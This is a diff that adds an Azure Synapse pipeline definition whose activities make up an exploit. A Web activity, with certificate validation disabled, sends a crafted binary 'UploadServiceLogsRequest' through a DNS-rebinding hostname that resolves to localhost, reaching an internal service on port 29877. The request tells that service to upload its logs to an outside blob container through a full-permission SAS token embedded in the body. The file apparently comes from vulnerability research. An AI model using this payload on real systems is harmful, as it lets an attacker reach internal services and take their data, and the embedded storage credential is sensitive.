@@ -1,0 +1,84 @@
+{
+	"name": "Pipeline 6",
+	"properties": {
+		"activities": [
+			{
+				"name": "Copy data1",
+				"type": "Copy",
+				"dependsOn": [],
+				"policy": {
+					"timeout": "7.00:00:00",
+					"retry": 0,
+					"retryIntervalInSeconds": 30,
+					"secureOutput": false,
+					"secureInput": false
+				},
+				"userProperties": [],
+				"typeProperties": {
+					"source": {
+						"type": "BinarySource",
+						"storeSettings": {
+							"type": "HttpReadSettings",
+							"requestMethod": "POST",
+							"requestBody": "\t\u0018UploadServiceLogsRequest\u0001\u0001\t“\u0001https://datalakeyanir.blob.core.windows.net/testfs/logsdir?sp=racwdlmeop&st=2021-11-29T15:09:07Z&se=2021-11-29T23:09:07Z&spr=https&sv=2020-08-04&sr=d&sig=cqcZFq1ipgZYPlvzHPhTnvUNsRuA%2BGB14y9yx%2BV4R3M%3D&sdd=1i\u0007somedir\u0000",
+							"requestTimeout": ""
+						},
+						"formatSettings": {
+							"type": "BinaryReadSettings"
+						}
+					},
+					"sink": {
+						"type": "RestSink",
+						"httpRequestTimeout": "00:01:40",
+						"requestInterval": 10,
+						"requestMethod": "POST",
+						"writeBatchSize": 10000,
+						"httpCompressionType": "none",
+						"storeSettings": {
+							"type": "AzureBlobStorageWriteSettings"
+						}
+					},
+					"enableStaging": false
+				},
+				"inputs": [
+					{
+						"referenceName": "ControllerBinaryRequest",
+						"type": "DatasetReference"
+					}
+				],
+				"outputs": [
+					{
+						"referenceName": "yanirDataLakeDestination",
+						"type": "DatasetReference"
+					}
+				]
+			},
+			{
+				"name": "Web1",
+				"type": "WebActivity",
+				"dependsOn": [],
+				"policy": {
+					"timeout": "7.00:00:00",
+					"retry": 0,
+					"retryIntervalInSeconds": 30,
+					"secureOutput": false,
+					"secureInput": false
+				},
+				"userProperties": [],
+				"typeProperties": {
+					"url": "https://7f000001.12c0ce6e.rbndr.us:29877/?",
+					"connectVia": {
+						"referenceName": "AutoResolveIntegrationRuntime",
+						"type": "IntegrationRuntimeReference"
+					},
+					"method": "PUT",
+					"body": "\t\u0018UploadServiceLogsRequest\u0001\u0001\t“\u0001https://datalakeyanir.blob.core.windows.net/testfs/logsdir?sp=racwdlmeop&st=2021-11-29T15:09:07Z&se=2021-11-29T23:09:07Z&spr=https&sv=2020-08-04&sr=d&sig=cqcZFq1ipgZYPlvzHPhTnvUNsRuA%2BGB14y9yx%2BV4R3M%3D&sdd=1i\u0007somedir\u0000",
+					"disableCertValidation": true
+				}
+			}
+		],
+		"annotations": [],
+		"lastPublishTime": "2021-11-30T07:32:44Z"
+	},
+	"type": "Microsoft.Synapse/workspaces/pipelines"
+}
